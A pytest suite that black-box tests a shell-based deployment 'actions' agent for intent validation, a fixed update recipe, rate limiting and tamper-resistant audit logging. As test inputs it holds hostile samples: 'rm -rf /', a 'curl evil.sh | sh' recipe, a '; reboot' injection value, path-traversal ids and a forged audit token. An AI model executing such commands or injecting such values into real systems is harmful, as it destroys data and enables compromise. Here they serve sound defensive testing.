"""C43 Stage 2b-ii curator-actions host agent (deploy/scripts/actions.sh) — decision-logic tests.

The actions agent is POSIX sh, tested as a BLACK BOX through `sh` over a fake data tree built under
tmp_path: a gateway state dir (where intents land), a site-data/builds inventory (rollback targets), a
backups inventory (restore snapshots), a code checkout, and SHIMS for `docker compose` / `git` / the
backup script / the restore drill (AUSMT_ACTIONS_*) that RECORD their invocation to a marker file. Every
assertion is an INDEPENDENT OBSERVABLE (the shim's recorded argv, the audit log's lines, the live DB
bytes, the intent file's presence, the process exit code) — never the script's own self-report.

Each test names its failure criterion (Invariant 10). The D9 hardening + D13 pins carried here:
  * unknown-intent refusal (D9.1) — an unknown *.request is IGNORED + audited, never executed.
  * rollback id validation (D9.2) — a bad-charset id and an id not in the retained inventory are both
    REFUSED + audited; NO rebuild, NO engine.
  * restore id validation (D9.2/D9.5) — a snapshot id not in the backup inventory is REFUSED; the live
    DB is byte-untouched.
  * restore drill-first (D8) — a FAILING drill ABORTS with the live DB byte-identical (proven against a
    passing-drill control that DOES swap).
  * update fixed-recipe (D13) — the executed command sequence is CONSTANT regardless of the intent's
    content (a hostile-content intent runs the identical git-pull + compose-pull + up -d).
  * single-flight (D9.3) — with two privileged intents pending, exactly ONE recipe runs per invocation.
  * rate limit (D9.3) — a repeat intent inside the cooldown window is REFUSED + audited.
  * audit-line-per-action (D9.4) — every executed/refused action appends exactly one audit line.

PLATFORM SPLIT (standing rule): the rollback FS-repoint POSITIVE leg (current symlink actually moves +
the pin file lands) needs a symlink-capable filesystem and is UBUNTU-ONLY (skipped where symlinks are
unavailable — Windows dev boxes without the privilege). The rollback DECISION half (validation, no
rebuild, audit) runs everywhere. flock true-concurrency is likewise not exercised here (Windows has no
flock); the one-intent-per-invocation structure is the everywhere-runnable single-flight guarantee.
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

_REPO = Path(__file__).resolve().parents[2]
_SCRIPT = _REPO / "deploy" / "scripts" / "actions.sh"

_SH = shutil.which("sh") or shutil.which("bash")
pytestmark = pytest.mark.skipif(_SH is None, reason="no POSIX sh/bash to run actions.sh")


def _symlinks_work(tmp: Path) -> bool:
    """True iff this filesystem/privilege can create a real symlink (Linux CI: yes; a Windows dev box
    without SeCreateSymbolicLinkPrivilege: no). Gates the rollback FS-repoint positive leg."""
    try:
        d = tmp / "_sltgt"
        d.mkdir()
        (tmp / "_sllink").symlink_to(d, target_is_directory=True)
        ok = (tmp / "_sllink").is_symlink()
        return ok
    except (OSError, NotImplementedError):
        return False


# UBUNTU-ONLY marker for the platform-dependent legs (flagged for the wait-for-greens push block).
_SYMLINKS = None  # resolved per-test against its own tmp_path


def _shim(path: Path, mark: Path, *, rc: int = 0) -> None:
    """Write a recording shim that appends its argv (prefixed by an uppercase tag = the basename) to
    `mark` and exits `rc`. The tag lets one marker file record several shims unambiguously."""
    tag = path.stem.upper().replace("-SHIM", "")
    path.write_text(
        "#!/bin/sh\n"
        f'echo "{tag} $*" >> "{mark.as_posix()}"\n'
        f"exit {rc}\n",
        encoding="utf-8",
    )
    path.chmod(0o755)


def _make_tree(tmp: Path, *, builds=("20260101T000000Z", "20260202T000000Z"),
               snaps=("20260303T000000Z",), drill_rc: int = 0, ratelimit_s: int = 0) -> dict:
    """Build the fake tree + shims. Returns {paths, env}."""
    data = tmp / "data"
    state = data / "gateway" / "state"
    site = data / "site-data"
    builds_dir = site / "builds"
    backups = data / "backups"
    code = tmp / "code"
    for b in builds:
        (builds_dir / b).mkdir(parents=True, exist_ok=True)
    for s in snaps:
        (backups / s).mkdir(parents=True, exist_ok=True)
    state.mkdir(parents=True, exist_ok=True)
    code.mkdir(parents=True, exist_ok=True)
    # A .git marker so the update recipe's "is this a checkout?" guard passes with the git SHIM (the
    # real `git pull` is replaced by the recording shim; the guard is a real existence check).
    (code / ".git").mkdir(exist_ok=True)
    (code / "deploy").mkdir(exist_ok=True)

    mark = tmp / "mark.txt"
    _shim(tmp / "compose-shim.sh", mark)
    _shim(tmp / "git-shim.sh", mark)
    _shim(tmp / "backup-shim.sh", mark)
    _shim(tmp / "drill-shim.sh", mark, rc=drill_rc)

    env = dict(os.environ)
    env.update(
        # Forward-slash (posix) paths so the sh script + shims echo a consistent form the assertions
        # normalise cleanly (Git Bash accepts C:/... paths; Linux paths have no backslashes anyway).
        AUSMT_DATA_DIR=data.as_posix(),
        AUSMT_CODE_DIR=code.as_posix(),
        AUSMT_BACKUP_DIR=backups.as_posix(),
        # The shims carry a #!/bin/sh shebang and are +x, so they are invoked BY PATH (no `sh` prefix)
        # — avoids word-splitting the interpreter path (Git Bash's sh.EXE lives under "Program Files").
        AUSMT_ACTIONS_COMPOSE=(tmp / "compose-shim.sh").as_posix(),
        AUSMT_ACTIONS_GIT=(tmp / "git-shim.sh").as_posix(),
        AUSMT_ACTIONS_BACKUP=(tmp / "backup-shim.sh").as_posix(),
        AUSMT_ACTIONS_DRILL=(tmp / "drill-shim.sh").as_posix(),
        AUSMT_ACTIONS_RATELIMIT_S=str(ratelimit_s),
        # Deterministic lock path under tmp so parallel test runs never collide.
        AUSMT_ACTIONS_LOCK=str(tmp / "actions.lock"),
    )
    return {"data": data, "state": state, "site": site, "builds_dir": builds_dir,
            "backups": backups, "code": code, "mark": mark, "env": env}


def _write_intent(state: Path, kind: str, **fields) -> Path:
    p = state / f"{kind}.request"
    p.write_text(json.dumps(fields), encoding="utf-8")
    return p


def _run(env: dict) -> subprocess.CompletedProcess:
    return subprocess.run([_SH, str(_SCRIPT)], capture_output=True, text=True, env=env)


def _audit_lines(state: Path) -> list[str]:
    p = state / "actions-audit.log"
    if not p.is_file():
        return []
    return [ln for ln in p.read_text(encoding="utf-8").splitlines() if ln.strip()]


def _marks(mark: Path) -> list[str]:
    if not mark.is_file():
        return []
    return [ln for ln in mark.read_text(encoding="utf-8").splitlines() if ln.strip()]


# ---- unknown-intent refusal (D9.1) --------------------------------------------------------------
def test_unknown_intent_is_ignored_and_audited(tmp_path):
    """An UNKNOWN *.request in the state dir is IGNORED (no recipe) and audited as such. FAILS IF an
    off-allow-list intent triggers ANY recipe (a shim mark) or is silently dropped without an audit
    line. Non-vacuous: a KNOWN backup.request in the same run DOES run, proving the agent is live."""
    t = _make_tree(tmp_path)
    (t["state"] / "danger.request").write_text('{"cmd":"x"}', encoding="utf-8")
    r = _run(t["env"])
    assert r.returncode == 0, r.stderr
    assert _marks(t["mark"]) == [], f"an unknown intent must not run any recipe: {_marks(t['mark'])}"
    audit = _audit_lines(t["state"])
    assert any("intent=unknown" in ln and "danger.request" in ln and "ignored" in ln for ln in audit), \
        f"unknown intent must be audited as ignored: {audit}"


# ---- rollback id validation (D9.2) --------------------------------------------------------------
def test_rollback_invalid_charset_refused(tmp_path):
    """A rollback build id outside the [A-Za-z0-9TZ._-] charset (a traversal token) is REFUSED before
    any use, audited, and no repoint/rebuild happens. FAILS IF a hostile id is acted on."""
    t = _make_tree(tmp_path)
    _write_intent(t["state"], "rollback", requested_by="c1", build_id="../../etc")
    before = sorted(p.name for p in t["builds_dir"].iterdir())
    r = _run(t["env"])
    assert r.returncode == 0
    assert _marks(t["mark"]) == [], "a refused rollback must invoke no recipe"
    after = sorted(p.name for p in t["builds_dir"].iterdir())
    assert before == after, "rollback must never create a build dir (it repoints, never builds)"
    assert any("intent=rollback" in ln and "refused: invalid build id" in ln
               for ln in _audit_lines(t["state"])), _audit_lines(t["state"])


def test_rollback_id_not_in_inventory_refused(tmp_path):
    """A rollback build id that passes the charset but is NOT a real retained build is REFUSED (D9.2 —
    validated against the REAL inventory, not just a pattern), audited, no rebuild. FAILS IF a
    well-formed but non-existent id is accepted. Non-vacuous: the charset is clean, so ONLY the
    inventory check can catch it."""
    t = _make_tree(tmp_path)
    _write_intent(t["state"], "rollback", requested_by="c1", build_id="20260909T000000Z")
    r = _run(t["env"])
    assert r.returncode == 0
    assert _marks(t["mark"]) == []
    assert any("intent=rollback" in ln and "not in retained inventory" in ln
               for ln in _audit_lines(t["state"])), _audit_lines(t["state"])


def test_rollback_repoints_no_rebuild(tmp_path):
    """ROLLBACK-REPOINTS PIN. A valid rollback.request repoints `current` to the named retained build,
    writes the rollback.pin, adds NO new build dir, and invokes NO engine/build (it repoints, never
    rebuilds). FAILS IF rollback triggers a rebuild, leaves current unswapped, or omits the pin.

    The FS-repoint half (current actually moves + pin lands) needs symlinks and is UBUNTU-ONLY; where
    symlinks are unavailable this still asserts the everywhere-true half: NO new build dir, NO recipe
    shim invoked (no engine), and an audit line for the rollback."""
    t = _make_tree(tmp_path)
    target = "20260202T000000Z"
    _write_intent(t["state"], "rollback", requested_by="curator1", build_id=target)
    before = sorted(p.name for p in t["builds_dir"].iterdir())
    r = _run(t["env"])
    after = sorted(p.name for p in t["builds_dir"].iterdir())
    assert before == after, "rollback must NOT create a new build dir (no rebuild)"
    # No compose/git/backup/drill shim: rollback is a pure repoint, never the engine.
    assert _marks(t["mark"]) == [], f"rollback must invoke no build recipe: {_marks(t['mark'])}"
    if _symlinks_work(tmp_path):
        assert r.returncode == 0, r.stderr
        cur = t["site"] / "current"
        assert cur.is_symlink(), "current must be a symlink after a rollback"
        assert os.readlink(str(cur)).replace("\\", "/").endswith(f"builds/{target}"), \
            f"current must point at builds/{target}, got {os.readlink(str(cur))}"
        pin = t["state"] / "rollback.pin"
        assert pin.is_file(), "rollback must write the rollback.pin the reconcile tick respects"
        assert json.loads(pin.read_text())["pinned_build"] == target
        assert any("intent=rollback" in ln and target in ln and "ok:" in ln
                   for ln in _audit_lines(t["state"])), _audit_lines(t["state"])
    else:  # Windows dev box: the decision half only.
        assert any("intent=rollback" in ln and target in ln for ln in _audit_lines(t["state"])), \
            _audit_lines(t["state"])


# ---- restore id validation + drill-first (D9.2/D9.5/D8) ------------------------------------------
def _live_db(state: Path, content: bytes = b"LIVE-DB-ORIGINAL") -> Path:
    db = state / "gateway.sqlite"
    db.write_bytes(content)
    return db


def _snapshot_db(backups: Path, snap: str, content: bytes = b"SNAPSHOT-DB-BYTES") -> None:
    (backups / snap / "gateway.sqlite").write_bytes(content)


def test_restore_snapshot_not_in_inventory_refused_db_untouched(tmp_path):
    """RESTORE TYPED-ID PIN. A restore snapshot id not in the real backup inventory is REFUSED; the
    live DB is byte-untouched. FAILS IF a non-existent snapshot id swaps (or corrupts) the live DB.
    Non-vacuous: the valid-id control below DOES swap, so this is not a no-op path."""
    t = _make_tree(tmp_path)
    live = _live_db(t["state"])
    original = live.read_bytes()
    _write_intent(t["state"], "restore", requested_by="c1", snapshot_id="20261212T000000Z")
    r = _run(t["env"])
    assert r.returncode == 0
    assert live.read_bytes() == original, "a refused restore must leave the live DB byte-identical"
    assert _marks(t["mark"]) == [], "a refused restore must not stop/restart the gateway or drill"
    assert any("intent=restore" in ln and "not in inventory" in ln
               for ln in _audit_lines(t["state"])), _audit_lines(t["state"])


def test_restore_drill_fail_aborts_db_untouched(tmp_path):
    """RESTORE DRILL-FAIL PIN (record D8). A snapshot whose restore DRILL FAILS aborts the restore with
    the live DB BYTE-IDENTICAL — the drill runs FIRST, before any swap. FAILS IF a failing drill still
    swaps the DB. Proven against the passing-drill control (next test) that DOES swap: the ONLY
    difference is the drill's exit code."""
    t = _make_tree(tmp_path, drill_rc=1)          # the drill shim now FAILS
    live = _live_db(t["state"])
    original = live.read_bytes()
    _snapshot_db(t["backups"], "20260303T000000Z")
    _write_intent(t["state"], "restore", requested_by="c1", snapshot_id="20260303T000000Z")
    r = _run(t["env"])
    assert r.returncode == 1, "a drill-fail restore must exit nonzero"
    assert live.read_bytes() == original, "DRILL-FAIL must leave the live DB byte-identical (untouched)"
    marks = _marks(t["mark"])
    assert any(m.startswith("DRILL") for m in marks), "the drill must have run (drill-first)"
    # The gateway is stopped then restarted; it is never left down on an abort.
    assert any("stop gateway" in m for m in marks) and any("up -d gateway" in m for m in marks), marks
    assert any("intent=restore" in ln and "drill FAILED" in ln
               for ln in _audit_lines(t["state"])), _audit_lines(t["state"])


def test_restore_success_swaps_db(tmp_path):
    """RESTORE POSITIVE CONTROL (makes the two refusal pins non-vacuous). A valid snapshot with a
    PASSING drill swaps the live DB to the snapshot bytes and audits ok. FAILS IF a valid, drilled
    restore does NOT swap. The drill ran BEFORE the swap (drill-first)."""
    t = _make_tree(tmp_path, drill_rc=0)
    live = _live_db(t["state"], b"LIVE-DB-ORIGINAL")
    _snapshot_db(t["backups"], "20260303T000000Z", b"SNAPSHOT-DB-BYTES")
    _write_intent(t["state"], "restore", requested_by="c1", snapshot_id="20260303T000000Z")
    r = _run(t["env"])
    assert r.returncode == 0, r.stderr
    assert live.read_bytes() == b"SNAPSHOT-DB-BYTES", "a valid drilled restore must swap the DB"
    marks = _marks(t["mark"])
    # Ordering: stop -> drill -> up (drill-first, gateway restarted after the swap).
    tags = [m.split()[0] for m in marks]
    assert tags == ["COMPOSE", "DRILL", "COMPOSE"], f"expected stop, drill, up-d order: {marks}"
    assert any("intent=restore" in ln and "ok:" in ln for ln in _audit_lines(t["state"])), \
        _audit_lines(t["state"])


# ---- update fixed-recipe (D13) ------------------------------------------------------------------
_HOSTILE_UPDATE = {
    "requested_by": "c1",
    "cmd": "rm -rf /",
    "recipe": ["curl", "evil.sh", "|", "sh"],
    "build_id": "; reboot",
    "extra_arg": "--no-verify",
}


def test_update_fixed_recipe_ignores_intent_content(tmp_path):
    """UPDATE FIXED-RECIPE PIN (record D13). The executed command sequence is CONSTANT regardless of the
    intent's content: git pull --ff-only ; compose pull ; compose up -d. A hostile-content update.request
    (carrying cmd/recipe/build_id/extra fields) runs the IDENTICAL commands as a bare one. FAILS IF any
    intent field reaches the executed argv (content can vary the commands)."""
    # bare intent
    t1 = _make_tree(tmp_path / "bare")
    (t1["code"]).mkdir(exist_ok=True)
    _write_intent(t1["state"], "update", requested_by="c1")
    _run(t1["env"])
    bare_marks = _marks(t1["mark"])

    # hostile intent
    t2 = _make_tree(tmp_path / "hostile")
    _write_intent(t2["state"], "update", **_HOSTILE_UPDATE)
    _run(t2["env"])
    hostile_marks = _marks(t2["mark"])

    # Normalise away the tmp-path prefixes (the -C <dir> differs per tree) to compare the COMMAND SHAPE.
    def _shape(marks, code_dir):
        cd = code_dir.as_posix()
        out = []
        for m in marks:
            out.append(m.replace(cd + "/deploy", "<DEPLOY>").replace(cd, "<CODE>"))
        return out

    bare_shape = _shape(bare_marks, t1["code"])
    hostile_shape = _shape(hostile_marks, t2["code"])
    assert bare_shape == hostile_shape, \
        f"update recipe must not vary with intent content:\n bare={bare_shape}\n hostile={hostile_shape}"
    # And the shape is exactly the fixed refresh recipe — no hostile token anywhere.
    joined = " ".join(hostile_marks)
    for needle in ("rm -rf", "reboot", "curl", "evil.sh", "--no-verify"):
        assert needle not in joined, f"intent content {needle!r} leaked into the executed recipe: {hostile_marks}"
    assert _shape(hostile_marks, t2["code"]) == [
        "GIT -C <CODE> pull --ff-only", "COMPOSE -f <DEPLOY>/compose.yaml pull",
        "COMPOSE -f <DEPLOY>/compose.yaml up -d",
    ], hostile_marks


def test_compose_uses_project_file_flag_never_dash_C(tmp_path):
    """S2 ARG-SHAPE PIN. `docker compose` has NO `-C` flag (that is git) — every compose invocation
    must carry `-f`/`--project-directory` pointing at the deployment, never `-C`. FAILS IF a compose
    call is shaped with `-C` (the real-box breakage the shim masked). Exercises BOTH compose-using
    recipes: update (pull + up -d) and restore (stop + up)."""
    t = _make_tree(tmp_path / "u")
    _write_intent(t["state"], "update", requested_by="c1")
    _run(t["env"])
    t2 = _make_tree(tmp_path / "r")
    _live_db(t2["state"])
    _snapshot_db(t2["backups"], "20260303T000000Z")
    _write_intent(t2["state"], "restore", requested_by="c1", snapshot_id="20260303T000000Z")
    _run(t2["env"])
    for marks in (_marks(t["mark"]), _marks(t2["mark"])):
        for m in marks:
            if m.startswith("COMPOSE"):
                assert " -f " in f" {m} ", f"compose call must use -f, not bare/-C: {m}"
                assert " -C " not in f" {m} ", f"compose has no -C flag — invalid on real docker: {m}"


# ---- single-flight + priority (D9.3) ------------------------------------------------------------
def test_single_flight_one_recipe_per_invocation(tmp_path):
    """SINGLE-FLIGHT PIN (record D9.3). With TWO privileged intents pending, exactly ONE recipe runs
    per invocation (never two concurrently); the other intent remains for the next tick. FAILS IF two
    recipes run in one pass. (True flock concurrency is an ubuntu-only leg; this is the everywhere-true
    one-intent-per-invocation guarantee.)"""
    t = _make_tree(tmp_path)
    _write_intent(t["state"], "update", requested_by="c1")
    _write_intent(t["state"], "backup", requested_by="c1")
    _run(t["env"])
    # Update has higher priority than backup, so update runs and backup is left pending.
    marks = _marks(t["mark"])
    assert any(m.startswith("GIT") for m in marks), f"the higher-priority update should run: {marks}"
    assert not any(m.startswith("BACKUP") for m in marks), \
        f"the second intent must NOT also run in the same pass: {marks}"
    assert (t["state"] / "backup.request").is_file(), "the deferred intent must remain for the next tick"
    assert not (t["state"] / "update.request").is_file(), "the executed intent must be consumed"
    # A SECOND invocation now runs the deferred backup (one per tick).
    _run(t["env"])
    assert any(m.startswith("BACKUP") for m in _marks(t["mark"])), "the next tick runs the deferred intent"


# ---- rate limit (D9.3) --------------------------------------------------------------------------
def test_rate_limit_refuses_rapid_repeat(tmp_path):
    """RATE-LIMIT PIN (record D9.3). A repeat intent of the same kind inside the cooldown window is
    REFUSED + audited (the persistent-attack signal). FAILS IF a rapid repeat runs the recipe again.
    Non-vacuous: with the cooldown DISABLED (ratelimit_s=0) the repeat DOES run — proving the window,
    not a broken recipe, is what blocks it."""
    # cooldown ON (large window): second update refused
    t = _make_tree(tmp_path / "on", ratelimit_s=3600)
    _write_intent(t["state"], "update", requested_by="c1")
    _run(t["env"])
    _write_intent(t["state"], "update", requested_by="c1")
    _run(t["env"])
    marks = _marks(t["mark"])
    assert sum(1 for m in marks if m.startswith("GIT")) == 1, \
        f"the rate-limited repeat must NOT re-run the recipe: {marks}"
    assert any("refused: rate-limited" in ln for ln in _audit_lines(t["state"])), _audit_lines(t["state"])

    # cooldown OFF: both run (non-vacuous control)
    t2 = _make_tree(tmp_path / "off", ratelimit_s=0)
    _write_intent(t2["state"], "update", requested_by="c1")
    _run(t2["env"])
    _write_intent(t2["state"], "update", requested_by="c1")
    _run(t2["env"])
    assert sum(1 for m in _marks(t2["mark"]) if m.startswith("GIT")) == 2, \
        "with the cooldown disabled a repeat update must run again"


# ---- audit-line-per-action (D9.4) ---------------------------------------------------------------
def test_audit_line_per_action(tmp_path):
    """AUDIT-LINE PIN (record D9.4). Every action (executed or refused) appends exactly ONE audit line
    carrying intent, requesting curator, id, and outcome. FAILS IF an action leaves no audit trail, or
    the line omits the who/what."""
    t = _make_tree(tmp_path)
    _write_intent(t["state"], "backup", requested_by="curatorX")
    _run(t["env"])
    lines = _audit_lines(t["state"])
    assert len(lines) == 1, f"exactly one audit line per action: {lines}"
    ln = lines[0]
    assert "intent=backup" in ln and "by=curatorX" in ln and "outcome=" in ln, ln


def test_dry_run_takes_no_action(tmp_path):
    """--dry-run prints the decision and takes NO action: no recipe, no consume, no audit. FAILS IF a
    dry run mutates anything."""
    t = _make_tree(tmp_path)
    _write_intent(t["state"], "backup", requested_by="c1")
    r = subprocess.run([_SH, str(_SCRIPT), "--dry-run"], capture_output=True, text=True, env=t["env"])
    assert r.returncode == 0
    assert _marks(t["mark"]) == [], "dry-run must invoke no recipe"
    assert (t["state"] / "backup.request").is_file(), "dry-run must not consume the intent"
    assert _audit_lines(t["state"]) == [], "dry-run must write no audit line"


def test_restore_mktemp_fail_restarts_gateway(tmp_path):
    """S3 PIN. If staging the restore tmp FAILS after the gateway is stopped (disk/inode exhaustion —
    realistic during a disaster restore), the gateway MUST still be restarted — the sole ops surface is
    never left down. Forced by pointing the live DB at a path whose parent does not exist, so the
    restore mktemp fails. FAILS IF no `up -d gateway` mark appears on that post-stop path."""
    t = _make_tree(tmp_path, drill_rc=0)
    _snapshot_db(t["backups"], "20260303T000000Z")
    # AUSMT_ACTIONS_DB in a NON-EXISTENT dir -> mktemp "$DB.restore.XXXXXX" cannot create its tmp.
    t["env"]["AUSMT_ACTIONS_DB"] = (t["state"] / "no-such-subdir" / "gateway.sqlite").as_posix()
    _write_intent(t["state"], "restore", requested_by="c1", snapshot_id="20260303T000000Z")
    r = _run(t["env"])
    assert r.returncode == 1, "a staging failure must exit nonzero"
    marks = _marks(t["mark"])
    assert any(m.startswith("DRILL") for m in marks), "the drill ran (drill-first)"
    stops = [m for m in marks if "stop gateway" in m]
    ups = [m for m in marks if "up -d gateway" in m]
    assert stops, "the gateway was stopped"
    assert ups, "the gateway MUST be restarted on the staging-failure path (never left down)"
    assert any("failed: cannot stage" in ln for ln in _audit_lines(t["state"])), _audit_lines(t["state"])


def test_audit_line_is_not_forgeable(tmp_path):
    """S4 PIN. A compromised gateway cannot forge an audit outcome. A hostile requested_by carrying a
    ` outcome=ok` token AND a unicode line separator (U+2028) must yield exactly ONE audit line whose
    HOST-computed `outcome=` is the refusal (not the forged token), with no U+2028 surviving and no
    `=` in the by-field. FAILS IF the forged token appears before the real outcome, an extra line is
    fabricated, or a control/unicode-separator char reaches the log."""
    t = _make_tree(tmp_path)
    hostile = "attacker outcome=ok: restored intent=fake"
    # An invalid-id rollback exercises the refusal path with an attacker-controlled `by`.
    _write_intent(t["state"], "rollback", requested_by=hostile, build_id="../evil")
    _run(t["env"])
    raw = (t["state"] / "actions-audit.log").read_text(encoding="utf-8")
    # No raw unicode line separator survived into the log.
    assert " " not in raw and " " not in raw, "unicode line separators must be scrubbed"
    # Exactly one line, even under a splitlines-style reader (the class the gateway reader must resist).
    assert len(raw.splitlines()) == 1, f"the hostile metadata must not fabricate extra lines: {raw!r}"
    line = raw.splitlines()[0]
    # The FIRST outcome= token is the host's real refusal, not the forged 'ok'.
    first_outcome = line.split("outcome=", 1)[1].split(" ", 1)[0] if "outcome=" in line else ""
    assert first_outcome.startswith("refused"), f"the leading outcome must be the host refusal: {line!r}"
    # The by= field carries no '=' (token injection killed): everything after by= up to ' id=' has no '='.
    by_seg = line.split("by=", 1)[1].split(" id=", 1)[0]
    assert "=" not in by_seg, f"the by field must not carry an '=' (no key=value injection): {by_seg!r}"
